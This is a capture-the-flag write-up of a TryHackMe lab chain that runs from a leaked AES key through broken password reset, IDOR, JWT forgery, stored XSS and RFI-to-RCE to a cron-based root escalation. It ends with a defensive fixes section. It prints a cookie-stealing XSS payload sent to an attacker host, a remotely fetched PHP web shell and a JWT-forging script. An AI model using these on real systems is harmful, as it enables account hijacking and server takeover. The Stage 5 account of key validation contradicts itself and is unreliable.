# Nexus: Crypto Key to Root — TryHackMe

**Date:** 2026-09-09    
**Category:** Web, Full Chain (Web-to-Root)  
**Skills used:** Recon (Nmap, feroxbuster), hardcoded key recovery, broken password reset, IDOR, JWT secret leakage/forgery, stored XSS, RFI-to-RCE, Linux privilege escalation  

> **TL;DR:** A full compromise chain — recovered a truncated AES key from exposed JS, decrypted
> a config file to find internal usernames, abused a broken password-reset flow for account
> takeover, then escalated via **IDOR**, a **leaked JWT signing secret** (forged an admin token),
> **stored XSS** to steal a real admin session as confirmation, and an **RFI-to-RCE** bug in a
> file-serving endpoint — finishing with **root via a world-writable root cronjob**.

## Overview
This engagement chained together seven distinct vulnerabilities into a single path from
unauthenticated recon to root:
**recon → hardcoded key recovery → config decryption → account takeover (broken reset) → IDOR →
JWT forgery / stored XSS → RFI-to-RCE → cronjob privilege escalation.**

## Stage 1 — Recon
Ran an Nmap scan alongside a `curl` sweep to map related addresses and services on the target.

## Stage 2 — Hardcoded Key Recovery & Config Decryption
Found an `app.js` file that contained a **plaintext decryption key** for an accompanying
`config.enc` file — a hardcoded secret shipped to the client.

Converting the key to hex, it came out to **14 bytes**, but the cipher in use required a
**16-byte key** (AES-128). Rather than the key being wrong, this pointed to how the application
padded it internally — appending **2 null bytes** to reach 16 bytes decrypted the config
successfully. This revealed an internal system username: **`devops`**.

*Why this mattered:* recognizing the byte-length mismatch as a padding issue (not a broken key)
was the difference between a dead end and a working decryption.

## Stage 3 — Directory Discovery & Broken Password Reset (Account Takeover)
Using **feroxbuster**, discovered an API endpoint at **`/api/reset.php`**. Combining that with a
username harvested from the site's public **Team** page (`robert.wilson`), I triggered a
password reset:

```bash
curl -s -X POST http://$TARGET_IP/api/reset.php \
  -H "Content-Type: application/json" \
  -d '{"username":"robert.wilson"}' -i
```

The response **returned the reset token directly to the requester** — no email verification, no
proof of account ownership. This is a **broken password reset** flow: anyone who can guess or
find a valid username can reset that account's password unilaterally. Using the returned token:

```
http://$TARGET_IP/reset.php?token=[REDACTED]
```

…I set a new password for `robert.wilson` and had my **initial foothold**.

*Alternate path found:* `robert.wilson`'s original password was also independently
**brute-forceable** — a weak-password issue that would have granted the same access even
without the broken-reset bug.

## Stage 4 — IDOR on the Employee Dashboard
Once logged in, the dashboard loaded employee records by an ID in the request. Changing that ID
(`1, 2, 3, 4...`) returned **other employees' records with no authorization check** — a classic
**IDOR** (same class of bug as my dedicated IDOR writeup). Walking the IDs led me to the
**admin's notes**, which contained the engagement flag.

## Stage 5 — JWT Analysis and Forgery (Leaked Signing Secret)
Requesting a session JWT and decoding it showed a predictable structure:

```json
{"sub":"robert.wilson","role":"user","iat":1788866255,"exp":1788869855}
```
```python
import jwt
import time

payload = {
    "sub": "laura.hayes",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

secret = "N3xusK3y2024!!"

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

Critically, this token **I tried to decode it with the same key obtained earlier from `app.js` in Stage
2 because it is the only key I had it worked. Later I found that the any key would have worked because
the piece of code that validates the key was commented out so the key were never being validated** — 
the application reused its hardcoded secret as the **JWT signing key** (HS256). Since I
had that secret, I could write a Python script to **sign my own token from scratch**, setting
`"role":"admin"` and any username I chose, and the server would trust it because the signature
validates against the leaked key. This is a **forged/self-signed JWT via leaked HMAC secret** —
distinct from the `alg:none` trick in my API Pentesting writeup, but the same root cause: **the
server trusts a signature without re-deriving the claims from its own database.**

## Stage 6 — Stored XSS to Steal a Real Admin Session (Confirmation)
The app had a ticket-creation feature. An earlier **Nikto** scan had flagged possible XSS, so I
tested it with a cookie-exfiltration payload:

```html
<script>fetch("http://$ATTACKER_IP:4444/?c="+document.cookie)</script>
```

When an admin (`laura.hayes`) viewed the ticket, the payload fired and sent her live session
cookie to my listener — a **stored XSS** leading to session hijacking, and independent
confirmation of admin access alongside the forged JWT from Stage 5.

Comparing the two admin tokens was informative: my **forged** JWT carried `"role":"admin"`
because I set it directly in the payload, while a token legitimately issued by `token.php` for
`laura.hayes` **always came back `"role":"user"`, regardless of her real session** — the server
signs tokens correctly, but **never re-derives the role from the database**; it just trusts
whatever claims are inside a validly-signed token. That's the actual vulnerability underneath
both the forgery and the reason the "real" flow looked broken: the signature check is the only
check.

## Stage 7 — RFI to RCE via a File-Serving Endpoint
A file-retrieval endpoint accepted a `name` parameter. Reviewing its logic (via source
disclosure) showed:

```php
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
```

If `name` starts with `http://` or `https://`, the app fetches that URL via `file_get_contents()`
(only possible because `allow_url_fopen` was enabled on this server) — strips any `<?php` tag
from the response — and runs the rest through **`eval()`**, PHP's function for executing a
string as literal code. This is a textbook **Remote File Inclusion escalating straight to Remote
Code Execution**: whatever PHP sits at the attacker's URL executes on the server, not just
displays.

I hosted a simple shell and pointed the endpoint at it:

```php
// shell.php, hosted on my machine
<?php system($_GET['cmd']); ?>
```

```
name=http://$ATTACKER_IP:8000/shell.php&cmd=id
```

The server fetched my file, `eval()`'d it as real PHP, and executed `id` as the web server user
— full **arbitrary command execution**.

## Stage 8 — Post-Exploitation: Cronjob to Root
From the RCE shell, I found the `devops` password stored in a config file — pivoting to that
account. `devops` had ownership of a cronjob, **`health_report.sh`**, running as **root** on a
schedule. Since I owned the script, I modified it to reset the root password, waited for the
cron to fire, and logged in as **root** — a classic **writable root-cron privilege escalation**.

## The Fix (Defensive View)
Each stage has a distinct, real-world fix:
- **Hardcoded keys (Stage 2):** never ship encryption keys in client-side JS. Use server-side
  secret storage (a vault/KMS) and derive keys server-side only.
- **Broken password reset (Stage 3):** never return a reset token directly in the API response —
  send it out-of-band (email/SMS) to the account's registered contact, and use a short-lived,
  single-use, high-entropy token.
- **Weak passwords:** enforce complexity/length policy and lock out after repeated failures.
- **IDOR (Stage 4):** verify object ownership server-side on every request (see my IDOR writeup).
- **JWT (Stage 5):** never derive a signing secret from a value exposed to the client; store it
  server-side only, rotate it, and — critically — **re-derive authorization claims like `role`
  from the database on every request** rather than trusting them from the token body.
- **Stored XSS (Stage 6):** output-encode user-supplied content wherever it's rendered (ticket
  bodies included), and set the session cookie **`HttpOnly`** so even a successful XSS can't
  read it directly (see my XSS and Session Management writeups).
- **RFI/RCE (Stage 7):** disable `allow_url_fopen`/`allow_url_include`, never pass user input to
  `eval()` or `file_get_contents()` on an unrestricted URL, and allow-list expected file sources
  (see my File Inclusion writeup).
- **Cronjob privesc (Stage 8):** root-run scripts must not be writable by lower-privileged
  accounts; audit cron script ownership and permissions regularly.

## What I Learned
This was the most complete chain I've worked through — seven distinct vulnerability classes,
several of which only became exploitable *because* of an earlier stage (the JWT forgery only
worked because the Stage 2 key recovery leaked the same secret used for signing). The standout
insight was in Stage 5: comparing a forged token against a legitimately issued one showed that
**the real bug wasn't the leaked secret alone** — it was that the server never re-checks claims
against its own data, so a validly-signed token is trusted unconditionally. That distinction
(signature validity vs. claim correctness) is one I'll be looking for on every JWT-based app
from now on.
